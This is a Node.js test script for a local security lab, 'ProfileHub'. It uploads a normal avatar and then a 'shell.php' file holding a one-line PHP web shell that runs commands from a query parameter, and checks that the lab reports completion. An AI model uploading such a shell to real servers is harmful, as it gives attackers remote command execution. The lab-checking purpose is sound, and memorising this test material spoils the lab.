const http = require('http');

const PORT = 3000;

function requestWithCookieAndPost(path, cookie, contentType, postData) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'localhost',
      port: PORT,
      path: path,
      method: 'POST',
      headers: {
        'Cookie': cookie,
        'Content-Type': contentType,
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: body
        });
      });
    });

    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

function request(path) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'localhost',
      port: PORT,
      path: path,
      method: 'GET'
    };

    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: body
        });
      });
    });

    req.on('error', reject);
    req.end();
  });
}

function requestWithCookie(path, cookie) {
    return new Promise((resolve, reject) => {
      const options = {
        hostname: 'localhost',
        port: PORT,
        path: path,
        method: 'GET',
        headers: {
            'Cookie': cookie
        }
      };
  
      const req = http.request(options, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body: body
          });
        });
      });
  
      req.on('error', reject);
      req.end();
    });
  }

async function runTest() {
  console.log("Starting ProfileHub Test...");
  try {
    const res0 = await request('/labs/profilehub/');
    const cookie = res0.headers['set-cookie'] ? res0.headers['set-cookie'][0].split(';')[0] : '';
    console.log("Session Cookie:", cookie);

    const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
    
    // Normal workflow
    const postDataNormal = 
`--${boundary}\r\n` +
`Content-Disposition: form-data; name="file"; filename="avatar.jpg"\r\n` +
`Content-Type: image/jpeg\r\n` +
`\r\n` +
`fake image content\r\n` +
`--${boundary}--\r\n`;

    await requestWithCookieAndPost('/labs/profilehub/upload', cookie, `multipart/form-data; boundary=${boundary}`, postDataNormal);
    console.log("Uploaded normal avatar.");

    // Malicious workflow
    const postDataHack = 
`--${boundary}\r\n` +
`Content-Disposition: form-data; name="file"; filename="shell.php"\r\n` +
`Content-Type: application/x-php\r\n` +
`\r\n` +
`<?php system($_GET['cmd']); ?>\r\n` +
`--${boundary}--\r\n`;

    await requestWithCookieAndPost('/labs/profilehub/upload', cookie, `multipart/form-data; boundary=${boundary}`, postDataHack);
    console.log("Uploaded malicious shell.php.");

    const resFinal = await requestWithCookie('/labs/profilehub/', cookie);
    if (resFinal.body.includes('Investigation Complete') || resFinal.body.includes('✓ Investigation Complete') || resFinal.body.includes('Completed')) {
      console.log("PASS: File Upload Completed");
    } else {
      console.log("FAIL: File Upload Not Completed");
    }
  } catch (err) {
    console.error("Test failed with error:", err);
  }
}

runTest();
